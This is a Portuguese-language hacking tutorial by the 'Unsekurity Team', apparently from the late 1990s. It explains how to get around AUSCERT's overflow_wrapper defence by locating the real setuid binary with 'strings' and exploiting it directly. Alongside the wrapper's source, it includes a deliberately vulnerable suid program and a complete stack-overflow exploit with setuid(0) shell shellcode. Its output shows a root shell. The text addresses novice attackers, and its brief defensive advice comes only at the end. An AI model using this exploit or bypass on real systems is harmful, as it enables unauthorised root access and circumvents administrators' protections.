@@ -1,0 +1,489 @@
+##############################################################################
+############################# UNSEKURITY TEAM ################################
+##############################################################################
+
+
+Estes e outros textos podem ser obtidos em:
+
+http://unsekurity.virtualave.net/
+http://unsekurity.cyberpunk.com.br/
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+
+
+		     ----------------------------
+		    |  TECNICA PARA PASSAR POR   |
+		    |	   OVERFLOW WRAPPER	 |
+		     ----------------------------
+
+
+------------------------------- INDICE --------------------------------
+
+1. - INTRODUCAO.
+2. - COMO FUNCIONA O OVERFLOW_WRAPPER.
+3. - TRUQUE BASICO.
+4. - TERMINANDO.
+   4.1 - Links e Referencias.
+   4.2 - Consideracoes Finais.
+
+-----------------------------------------------------------------------
+
+---------------
+1. INTRODUCAO  |
+---------------
+
+Para se defender de buffer overflows um administrador de redes eh capaz
+de tudo.Sem sombra de duvida, se o programa principal eh bugado, a melhor
+solucao a vista eh ajeita-lo diretamente no codigo fonte atraves de patchs,
+tentando assim eliminar a possivel condicao de buffer overflow.No entanto,
+as coisas tem caminhado para um "comodidade" por parte da "seguranca" e dos
+admins num modo geral, de modo que, estao confiando muito em softwares que
+"dizem" serem "capazes" de dificultar um buffer overflow (diga-se Stack
+Overflow) ao maximo.Uma dessas ferramentas surgiu ha alguns anos, na epoca,
+era considerado algo "grandioso", mas veremos que isso nao eh essas coisas
+nem nunca foi.Essa ferramenta se chama overflow_wrapper, e sua utilidade eh
+tentar "limitar a exploitacao que tem argumentos da linha de comando 
+vulneraveis a buffer overflows", como vimos, a definicao do proprio programa
+se limita a linha de comando.Ele pode ser util em programas bugados de
+empresas  que demoram a consertar seus bugs(empresas de codigo-fonte fechado), 
+de modo que existem admins que por praticidade adotam o uso deste programa.
+Irei descrever de forma bem basica, alguns simples metodos de passar por
+esse programa, coisas basicas.Espero que isto venha a ser util para alguem.
+
+------------------------------------
+2. COMO FUNCIONA O OVERFLOW_WRAPPER |
+------------------------------------
+
+Como foi dito, esta eh uma ferramenta antiga, mas ainda assim eh muito
+usada.Abaixo segue o codigo fonte da mesma:
+
+--------------------------overflow_wrapper.c------------------------------
+/*
+ * overflow_wrapper.c -- wrap programs to prevent command line argument
+ *                  buffer overrun vulnerabilities
+ *
+ *      This wrapper is designed to limit exploitation of programs which have 
+ *      command line argument buffer overflow vulnerabilities.
+ *      
+ *      The vulnerable program is replaced by this wrapper.  The original
+ *      vulnerable program being moved to another location and its
+ *      permissions restricted.  This wrapper checks each argument's length
+ *      to ensure it doesn't exceed a given length before executing
+ *      the original program.
+ *      
+ *      The latest version of this wrapper is available from:
+ *      
+ *      ftp://ftp.auscert.org.au/pub/auscert/tools/overflow/overflow_wrapper.c
+ *
+ *
+ *      The MD5 checksum for this file can be retrieved from:
+ *
+ *      ftp://ftp.auscert.org.au/pub/auscert/tools/overflow/CHECKSUM
+ *
+ *
+ *      This program is designed to be an interim relief measure 
+ *      until official vendor patches are made available.
+ *
+ *
+ * Author:      AUSCERT
+ *              Prentice Centre
+ *              Qld.  4072.
+ *              Australia.
+ *
+ *              auscert@auscert.org.au
+ *
+ * DISCLAIMER:  The use of this program is at your own risk.  It is
+ *              designed to combat a particular vulnerability, and may
+ *              not combat other vulnerabilities, either past or future.
+ *              The decision to use this program is yours, as are the
+ *              consequences of its use.
+ *
+ *              This program is designed to be an interim relief measure
+ *              until appropriate patches can be obtained from your vendor.
+ *
+ * REVISION:
+ *
+ * V 1.1        13 May 1997 - Changed syslog option to log correctly under 
+ *                            Solaris 2.x.
+ *
+ *
+ * Installation instructions
+ * ~~~~~~~~~~~~~~~~~~~~~~~~~
+ *
+ *  1.  su to root
+ *
+ *  2.  Determine the location of the program you wish to protect.
+ *
+ *      For example purposes, we'll assume the program we wish to wrap is
+ *      /usr/bin/vul_prog.
+ *
+ *  3.  Determine the permissions, owner, and group of vul_prog.  Note this
+ *      information as it will be used later.  For example:
+ *
+ *          # ls -l /usr/bin/vul_prog
+ *          -r-sr-xr-x  1 root  bin  20480 Jul 17 12:30 /usr/bin/vul_prog
+ *
+ *      In particular, note whether the program is setuid or setgid.
+ *
+ *  4.  Copy the vul_prog program to vul_prog.real, and then restrict
+ *      its permissions.
+ *
+ *              # cd /usr/bin
+ *              # cp vul_prog vul_prog.real
+ *              # chmod 511 vul_prog.real
+ *
+ *  5.  Note the location of vul_prog.real.  This will be used 
+ *      as the definition of REAL_PROG when compiling this wrapper.
+ *      This should be an absolute pathname.  In this example,
+ *      "/usr/bin/vul_prog.real"
+ *
+ *  6.  Compile this program in a non world writable directory other than 
+ *      /usr/bin.
+ *
+ *      For example, to use /usr/local/src, first copy this file to
+ *      /usr/local/src.  
+ *
+ *              # cd /usr/local/src
+ *
+ *      There are two defines required to compile this program:
+ *
+ *      REAL_PROG:  This is the location noted in step #5.
+ *
+ *      For this example, REAL_PROG is "/usr/bin/vul_prog.real"
+ *
+ *      MAXARGLEN:  This wrapper will exit without executing REAL_PROG
+ *      when given any command line arguments which exceed MAXARGLEN in
+ *      length.
+ *
+ *      This will need to be adjusted depending on the program being
+ *      wrapped.  It should be made as small as possible while still
+ *      allowing the program to function correctly.  If you are compiling
+ *      this program as part of an AUSCERT advisory workaround, the
+ *      advisory will list a suggested MAXARGLEN.
+ *
+ *      For this example, we'll set MAXARGLEN to 16.
+ *
+ *      Once you have the values of REAL_PROG and MAXARGLEN you can
+ *      compile this program.
+ *
+ *              # cc -DREAL_PROG='"/usr/bin/vul_prog.real"' -DMAXARGLEN=16 \ 
+ *                      -o vul_prog_wrapper overflow_wrapper-1.1.c
+ *
+ *      If you wish error messages to be logged by syslog when
+ *      arguments that may exploit the buffer overrun vulnerability 
+ *      are passed to vul_prog, add -DSYSLOG to the compile time options.
+ *
+ *              # cc -DREAL_PROG='"/usr/bin/vul_prog.real"' -DMAXARGLEN=16 \
+ *                       -DSYSLOG -o vul_prog_wrapper overflow_wrapper-1.1.c
+ *
+ *      Note that when compiling the value of REAL_PROG needs to be enclosed 
+ *      in single quotes (') as shown above.
+ *
+ *      If you get any messages about REAL_PROG or MAXARGLEN 
+ *      being undefined ensure that the cc command you are using sets
+ *      these values (similar to the example commands shown above).
+ *
+ *  7.  Copy this new wrapper program, vul_prog_wrapper,  into the directory 
+ *      originally containing vul_prog.  This will replace the existing 
+ *      vul_prog program.
+ *
+ *      Make sure this directory and its parent directories are protected so
+ *      only root is able to make changes to files in the directory.
+ *
+ *      Use the information found in step #3 and set the same 
+ *      owner, group, permissions and privileges on the new vul_prog program.  
+ *
+ *      For example:
+ *
+ *              # cp vul_prog_wrapper /usr/bin/vul_prog
+ *              # cd /usr/bin
+ *              # chown root vul_prog
+ *              # chgrp bin vul_prog
+ *              # chmod 4555 vul_prog
+ *
+ *      Check that the owner, group, permissions and privileges exactly
+ *      match those noted in step #3.
+ *
+ *              # ls -l /usr/bin/vul_prog
+ *
+ *      Users will not be able to use the vul_prog program during the time 
+ *      when the wrapper is copied into place until the chmod command 
+ *      has been executed.
+ *
+ * 8.   Check that vul_prog still works!
+ *
+ */
+
+static char     Version[] = "overflow_wrapper-1.1 V1.1 13-May-1997";
+
+
+#include <stdio.h>
+#include <syslog.h>
+
+/*
+ * This wrapper will exit without executing REAL_PROG when
+ * given any command line arguments which exceed MAXARGLEN in length.  
+ */
+
+main(argc,argv,envp)
+int     argc;
+char    *argv[];
+char    *envp[];
+{
+        int     i;
+        
+        for (i=0; i<argc; i++)
+        {
+                if (strlen(argv[i]) > MAXARGLEN)
+                {
+                        fprintf(stderr,"You have exceeded the argument length .
+..Exiting\n");
+#ifdef SYSLOG
+                        syslog(LOG_DAEMON|LOG_ERR,"%.32s: possible buffer overr
+un attack by uid %d\n", argv[0], getuid());
+#endif
+
+                        exit(1);
+                }
+        }
+        execve(REAL_PROG, argv, envp);
+        perror("execve failed");
+        exit(1);
+}
+------------------------------------------------------------------------------
+
+Como voce pode ver perfeitamente, este eh um programa simples, sem segredo
+algum, o que ele faz eh checar o tamanho de um argumento da linha de
+comando referente ao programa bugado, se for maior que o definido como
+MAXARGLEN, ele irah imprimir a string "You have exceeded the argument
+length ...Exiting" (Isso pode ser retirado ou mesmo alterado para algo
+como Segmentation Fault, tentando dificultar nossa percepcao) e em seguida
+ira logar a tentativa de buffer overflow por um usuario com uid X no
+syslog.
+Entao amigo, se voce tentar um buffer overflow e receber a mensagem acima
+ou mesmo se voce tentar muito e nao conseguir nada e tiver certeza de que
+aquele programa eh bugado, entao eh possivel que o administrador esteja
+usando overflow_wrapper.
+
+-----------------
+3. TRUQUE BASICO |
+-----------------
+
+Existe um perigo consideravel em se confiar nessas ferramentas.Digo essas
+que em breve estaremos derrubando mais mitos caracteristicos da comunidade
+de seguranca, mitos esses que sao programas e tecnicas descritas como
+eficazes e eficientes que visam a seguranca e que podem ser facilmente
+"quebradas" por um fucador com conhecimentos basicos ou um cracker
+experiente.Como Kevin Poulsen dizia: " Um computador soh pode ser
+considerado seguro se o custo da invasao for maior do que o dos dados ou
+dos recursos que poderao ser utilizados". Entendeu o conceito dele???
+Por que alguem gastaria milhoes por algo que nao vale centavos?? Haja visto 
+crackers buscam o lucro.De qualquer forma, com overflow_wrappers nao eh
+diferente.Vejamos um exemplo de programa bugado que recebe argumentos da
+linha de comando:
+
+----------------------------------bug1.c-----------------------------------
+/* SIMPLES PROGRAMA BUGADO */
+#include <stdio.h>
+#include <stdlib.h>
+
+main(int argc, char *argv[]){
+char buffer[512];
+if(argc < 2){
+printf("Programa bugado!!\n");
+printf("Uso: %s <string>\n",argv[0]);
+exit(0);
+}
+strcpy(buffer,argv[1]);
+printf("Voce digitou %s!!\n",buffer);
+return 0;
+}
+----------------------------------------------------------------------------
+
+Aih estah a velha strcpy, que jah devia ter sido banida dos novos compiladores.
+Compile esse programa e torne-o suid.
+
+[localhost]# gcc -o /tmp/bug1 /tmp/bug1.c
+[localhost]# chmod +s /tmp/bug1
+
+Esse programa eh facilmente exploitado via Stack Overflow com qualquer
+exploit.Mas supondo que este bug eh antigo, entao o administrador usa
+overflow_wrapper para tornar as coisas mais dificeis para voce.Ele
+provavelmente faria o seguinte esquema:
+
+[localhost]# mv /tmp/bug1 /tmp/bug1.x
+[localhost]# gcc -DREAL_PROG='"/tmp/bug1.x"' -DMAXARGLEN=500 -o /tmp/bug1 
+overflow_wrapper.c
+[localhost]# ls /tmp/bug1
+
+Pronto, agora a coisa ficou mais dificil.Mas nao muito..:).Basta usarmos
+strings e ver se existe algum redirecionamento, esse redirecionamento
+nos diria se o programa estah ou nao com overflow_wrapper.Vejamos:
+
+[localhost]$ strings /tmp/bug1 | more
+....
+GLIBC_2.0
+PTRhp
+You have exceeded the argument length .
+..Exiting
+/tmp/bug1.x
+execve failed
+overflow_wrapper-1.1 V1.1 13-May-1997
+init.c
+/tmp/glibc-2.1.2/csu/
+gcc2_compiled.
+....
+
+Aih estah as strings..Lembrando que as mesmas podem ser mudadas, se o
+cara colocar "Segmentation Fault" para tentar te enganar, ela vai aparecer
+aih.:)...logo abaixo a ela(a string) vem o verdadeiro executavel /tmp/bug1.x.
+Aih eh soh fazer um exploit para isso, exemplo segue abaixo:
+
+------------------------------- exploit1.c --------------------------------
+/* Simples Exemplo de exploit para buffer overflow */
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define TAMANHO_BUFFER        500
+#define NOP                  0x90
+#define OFFSET_PADRAO           0
+#define ALIGN                   0
+
+unsigned long pega_sp(void){
+__asm__("movl %esp, %eax");
+}
+char shellcode[]=
+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80" /* SETUID(0) */
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00"
+"\x4e\x41\x53\x48\x20\x4c\x45\x4f\x4e\x20\x76\x75\x6c\x67\x6f\x20"
+"\x63\x6f\x72\x61\x63\x61\x6f\x64\x65\x6c\x65\x61\x6f\x00\x2e\x00"
+"\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x20\x55\x4e\x53\x45"
+"\x4b\x55\x52\x49\x54\x59\x20\x54\x45\x41\x4d\x20\x2a\x2a\x2a\x2a"
+"\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x00\x68\x74\x74\x70\x3a\x2f\x2f\x75"
+"\x6e\x73\x65\x6b\x75\x72\x69\x74\x79\x2e\x76\x69\x72\x74\x61\x6c"
+"\x61\x76\x65\x2e\x6e\x65\x74\x2f\x00\x68\x74\x74\x70\x3a\x2f\x2f"
+"\x75\x6e\x73\x65\x6b\x75\x72\x69\x74\x79\x2e\x63\x79\x62\x65\x72"
+"\x70\x75\x6e\x6b\x2e\x63\x6f\x6d\x2e\x62\x72\x2f\x00\x2a\x2a\x2a"
+"\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a"
+"\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a"
+"\x2a\x2a\x2a\x2a\x00\x2e\x00";
+
+int main(int argc, char *argv[])
+{
+char *buffer;
+long retaddr;
+int i ,tamanho = 0, offset = 0;
+
+if(argc < 2){
+printf("Uso: %s <tamanho_do_buffer> <offset>\n",argv[0]);
+printf("Obs:Digite o tamanho do buffer!!\n\n");
+exit(0);
+}
+if (argc > 1) {
+tamanho = atoi(argv[1]);
+}
+if (argc > 2) {
+offset = atoi(argv[2]);
+}
+
+if(!(buffer = malloc(tamanho))){
+fprintf(stderr,"Nao pode alocar mamoria!!\n");
+exit(1);
+}
+retaddr = pega_sp() - offset;
+for (i=0;i<tamanho;i+=4)
+
+       {
+                buffer[i+ALIGN]=(retaddr&0x000000ff);
+                buffer[i+ALIGN+1]=(retaddr&0x0000ff00)>>8;
+                buffer[i+ALIGN+2]=(retaddr&0x00ff0000)>>16;
+                buffer[i+ALIGN+3]=(retaddr&0xff000000)>>24;
+        }
+for (i=0;i<(tamanho-strlen(shellcode)-100);i++)
+   *(buffer+i) = NOP;
+memcpy(buffer+i,shellcode,strlen(shellcode));
+/* Finalmente executamos o programa */
+execl("/tmp/bug1.x","/tmp/bug1.x",buffer,0);
+}
+-----------------------------------------------------------------------------
+
+[localhost]$ ./exploit1 550
+Voce digitou xxx
+...
+úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿!!
+sh-2.03# id
+uid=0(root) gid=100(users) groups=100(users)
+
+Podemos ver que strings realmente serve para alguma coisa..:)..Se voce 
+executar strings no arquivo verdadeiro '/tmp/bug1.x' verah que nao existe
+um "redirecionamento".Entao amigo, antes de tentar um overflow, cheque se
+o programa bugado nao estah sendo 'redirecionado' via overflow_wrapper.
+Como podemos notar, essa 'cobertura' nao eh lah tao eficiente.
+E se o administrador for "esperto" ou "estupido" o bastante e apagar o
+comando strings??? :)..Teve um aih que fez isso achando q tava tudo ok.:)
+Meus dois neuronios mandaram eu enviar um strings para lah..:)
+
+--------------
+4. TERMINANDO |
+--------------
+
+Bom, amigo, esse eh soh um esquema bobo.Enchi muita linguica, pois estar
+desempregado tem me matado.O jeito eh escrever esquemas bobos, mas 
+eficazes, e esse programa de seguranca foi visto durante algum tempo como
+uma solucao pratica.Um administrador nao deve nunca confiar somente nesses
+softwares, nao existe solucao contra buffer overflows que seja realmente
+eficiente.Esse programa pode vir a ser usado, sem sombra de duvida que
+pode sim, mas nao se deve confiar nele, melhor eh retirar o suid bit enquanto
+um patch eh providenciado, e acima de tudo usar sistemas abertos, pois a
+solucao dos problemas eh bem mais rapido.Para o fucador NewBie, aos poucos
+nos do Unsekurity Team vamos disponibilizar publicacoes derrubando mitos,
+e voces verao na pratica, que com um pouco de estudo e dedicacao, muitos
+esquemas usados por admins e pela comunidade de seguranca podem ser
+derrubados.
+
+4.1 - Links e Referencias
+--------------------------
+
+* Sobre overflow_wrapper:
+
+http://www.auscert.org.au/
+ftp://ftp.auscert.org.au/pub/auscert/tools/overflow/overflow_wrapper.c
+
+* Unsekurity Team:
+
+http://unsekurity.virtualave.net/
+http://unsekurity.cyberpunk.com.br/
+
+* Outros links de seguranca interessantes:
+
+http://www.hacker.com.br/
+http://www.bufferoverflow.org/
+
+
+4.2 - Consideracoes Finais
+---------------------------
+
+Aih estah amigo.Um esquema basico, solucionando um problema simples.
+Existem diversos programas e tecnicas usadas pela comunidade de seguranca
+para ajudar administradores de sistemas.Nos do Unsekurity Team, iremos aos
+poucos disponibilizar, alem de nossos tutoriais com material fucador,simples
+artigos descrevendo possiveis tecnicas para derrubar alguns destes programas
+e conceitos.
+Agradeco a todos que de uma forma ou de outra vem colaborando com ideias
+e sugestoes no que diz respeito a "quebrar" esses sistemas de seguranca.
+Sem sombra de duvida isso contribui na liberdade de informacao e na
+construcao de sistemas mais seguros, beneficiando assim o usuario comum.
+
+Gostaria de agradecer a todos do Unsekurity Team, module, psych, e-brain,
+t[rex], Cs0, raynox, CDMA, Schwarz, char, Dinamite_, alex-linux, antilove,
+mastery, xcarioca, J4ns, cync, t0x[i]c, CeZiNHa, Matt_Salermo,Xf86config,
+meu grande amigo zip, thunderoffire, o_corvo, psychodeath, Dani_Lindinha,
+BL4ck 0X1g3n, gid ,arse e a todos aqueles que contribuem distribuindo
+informacao "gratuita" e sem "pre-conceitos".
+
+----------------------------------EOF-------------------------------------
+
